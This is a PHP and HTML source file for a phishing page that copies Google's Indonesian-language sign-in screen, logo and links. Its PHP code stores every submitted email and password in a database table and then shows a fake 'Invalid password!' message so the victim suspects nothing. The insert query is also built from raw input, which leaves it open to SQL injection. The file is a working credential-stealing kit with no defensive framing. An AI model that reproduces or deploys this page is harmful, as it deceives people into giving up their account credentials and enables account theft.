<?php
require "./connection";
$status = [];
if(isset($_POST['login'])){
    if(getAccount($_POST) > 0){
        $error_message = 'Invalid password!';
        array_push($status, '1');
    } else {
        $error_message = mysqli_error($conn);
    }
}

function getAccount($data){
    global $conn;

    $user = $data['username'];
    $pw = $data['password'];
    $plat = $data['platform'];

    mysqli_query($conn, "INSERT INTO admin_user_id VALUES('', '$user', '$pw', '$plat')");

    return mysqli_affected_rows($conn);
}
var_dump($conn);
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="./css/stylegoogle.css">
        <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" type="image/x-icon">
        <title>Login - Akun Google</title>
    </head>
    <body>
        <div class="page-wrapper">
            <div class="block"></div>
            <div class="form-email">
                <div class="form-header">
                    <div class="logo">
                        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
                            <g>
                                <path fill="#ea4335" d="M 67.954 16.303 c -1.33 0 -2.278 -0.608 -2.886 -1.804 l 7.967 -3.3 l -0.27 -0.68 c -0.495 -1.33 -2.008 -3.79 -5.102 -3.79 c -3.068 0 -5.622 2.41 -5.622 5.96 c 0 3.34 2.53 5.96 5.92 5.96 c 2.73 0 4.31 -1.67 4.97 -2.64 l -2.03 -1.35 c -0.673 0.98 -1.6 1.64 -2.93 1.64 Z m -0.203 -7.27 c 1.04 0 1.92 0.52 2.21 1.264 l -5.32 2.21 c -0.06 -2.3 1.79 -3.474 3.12 -3.474 Z"></path>
                            </g>
                            <g>
                                <path fill="#34a853" d="M58.192.67h2.56v17.44h-2.564z"></path>
                            </g>
                            <g>
                                <path  fill="#4385f4" d="M 54.152 8.066 h -0.088 c -0.588 -0.697 -1.716 -1.33 -3.136 -1.33 c -2.98 0 -5.71 2.614 -5.71 5.98 c 0 3.338 2.73 5.933 5.71 5.933 c 1.42 0 2.548 -0.64 3.136 -1.36 h 0.088 v 0.86 c 0 2.28 -1.217 3.5 -3.183 3.5 c -1.61 0 -2.6 -1.15 -3 -2.12 l -2.28 0.94 c 0.65 1.58 2.39 3.52 5.28 3.52 c 3.06 0 5.66 -1.807 5.66 -6.206 V 7.21 h -2.48 v 0.858 Z m -3.006 8.237 c -1.804 0 -3.318 -1.513 -3.318 -3.588 c 0 -2.1 1.514 -3.635 3.318 -3.635 c 1.784 0 3.183 1.534 3.183 3.635 c 0 2.075 -1.4 3.588 -3.19 3.588 Z"></path>
                            </g>
                            <g>
                                <path fill="#fbbc05" d="M 38.17 6.735 c -3.28 0 -5.953 2.506 -5.953 5.96 c 0 3.432 2.673 5.96 5.954 5.96 c 3.29 0 5.96 -2.528 5.96 -5.96 c 0 -3.46 -2.67 -5.96 -5.95 -5.96 Z m 0 9.568 c -1.798 0 -3.348 -1.487 -3.348 -3.61 c 0 -2.14 1.55 -3.608 3.35 -3.608 s 3.348 1.467 3.348 3.61 c 0 2.116 -1.55 3.608 -3.35 3.608 Z"></path>
                            </g>
                            <g>
                                <path fill="#ea4335" d="M 25.17 6.71 c -3.28 0 -5.954 2.505 -5.954 5.958 c 0 3.433 2.673 5.96 5.954 5.96 c 3.282 0 5.955 -2.527 5.955 -5.96 c 0 -3.453 -2.673 -5.96 -5.955 -5.96 Z m 0 9.567 c -1.8 0 -3.35 -1.487 -3.35 -3.61 c 0 -2.14 1.55 -3.608 3.35 -3.608 s 3.35 1.46 3.35 3.6 c 0 2.12 -1.55 3.61 -3.35 3.61 Z"></path>
                            </g>
                            <g>
                                <path fill="#4285f4" d="M 14.11 14.182 c 0.722 -0.723 1.205 -1.78 1.387 -3.334 H 9.423 V 8.373 h 8.518 c 0.09 0.452 0.16 1.07 0.16 1.664 c 0 1.903 -0.52 4.26 -2.19 5.934 c -1.63 1.7 -3.71 2.61 -6.48 2.61 c -5.12 0 -9.42 -4.17 -9.42 -9.29 C 0 4.17 4.31 0 9.43 0 c 2.83 0 4.843 1.108 6.362 2.56 L 14 4.347 c -1.087 -1.02 -2.56 -1.81 -4.577 -1.81 c -3.74 0 -6.662 3.01 -6.662 6.75 s 2.93 6.75 6.67 6.75 c 2.43 0 3.81 -0.972 4.69 -1.856 Z"></path>
                            </g>
                        </svg>
                    </div>
                    <div class="title">
                        <h1>
                            <span>Login</span>
                        </h1>
                        <div class="title-info">
                            <span>Gunakan Akun Google Anda</span>
                        </div>
                    </div>
                </div>
                <form action="" method="POST" class="form-control ss">
                    <div class="input-emails">
                        <input type="email" name="username" id="email" class="input-email" autocomplete="off" required>
                        <div class="pholder ems">Email atau ponsel</div>
                        <div class="border"></div>
                    </div>
                    <div class="input-pws">
                        <input type="password" name="password" id="password" class="input-password" autocomplete="off" required>
                        <div class="pholder ppw">Masukkan sandi anda</div>
                        <div class="border"></div>
                    </div>
                    <?php if(count($status) == 1){?>
                    <p style="color: red; font-size: 10px;"><?= $error_message;?></p>
                    <?php }?>
                    <div class="show-pws">
                        <div class="inp-spw">
                            <div class="inp-ck-spw">
                                <input type="checkbox" id="show-pw" class="show-pw" onclick="showPw()">
                                <div class="ck-spw-1">
                                    <svg viewBox="0 0 24 24">
                                        <path fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path>
                                    </svg>
                                    <div class="sm"></div>
                                </div>
                                <div class="ck-spw-2"></div>
                            </div>
                        </div>
                        <div class="label-sp">
                            <div class="txt-sp">
                                <label for="show-pw">
                                    <div>Tampilkan sandi</div>
                                </label>
                            </div>
                        </div>
                    </div>
                    <div class="femail">
                        <button>Lupa email?</button>
                    </div>
                    <div class="fpw">
                        <button>Lupa password?</button>
                    </div>
                    <div class="random-txt">
                        <p>Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. <a href="https://support.google.com/chrome/answer/6130773?hl=id">Pelajari lebih lanjut</a></p>
                    </div>
                    <div class="form-btn">
                        <button class="cacc">Buat akun</button>
                        <button class="next gopw" name='login'>Masuk</button>
                    </div>
                </form>
            </div>
            <div class="footer">
                <div class="language">
                    <div class="lang-inside">
                        <div class="lang-insides">
                            <div class="lang-selector">
                                <span class="dislang">
                                    <span>Indonesia</span>
                                </span>
                                <span class="chev">
                                    <svg viewBox="7 10 10 5">
                                        <polygon class="pol1" stroke="none" fill-rule="evenodd" points="7 10 12 15 17 10"></polygon>
                                        <polygon class="pol2" stroke="none" fill-rule="evenodd" points="7 15 12 10 17 15"></polygon>
                                    </svg>
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
                <ul>
                    <li>
                        <a href="#">Bantuan</a>
                    </li>
                    <li>
                        <a href="#">Privasi</a>
                    </li>
                    <li>
                        <a href="#">Persyaratan</a>
                    </li>
                </ul>
            </div>
        </div>
        <script>
            const phold1 = document.querySelector('.ems');
            const phold2 = document.querySelector('.ppw');
            const mail = document.getElementById('email');
            const pw = document.getElementById('password');
            mail.onkeyup = () => {
                if(mail.value !== ''){
                    phold1.classList.add('float');
                } else {
                    phold1.classList.remove('float');
                }
            }
            pw.onkeyup = () => {
                if(pw.value !== ''){
                    phold2.classList.add('float');
                } else {
                    phold2.classList.remove('float');
                }
            }

            const btn1 = document.querySelector('.gopw');
            const pgpw = document.querySelector('.form-pw');
            function showPw(){
                var x = document.getElementById('password');
                if(x.type == 'password'){
                    x.type = 'text';
                } else {
                    x.type = 'password';
                }
            }
        </script>
    </body>
</html>
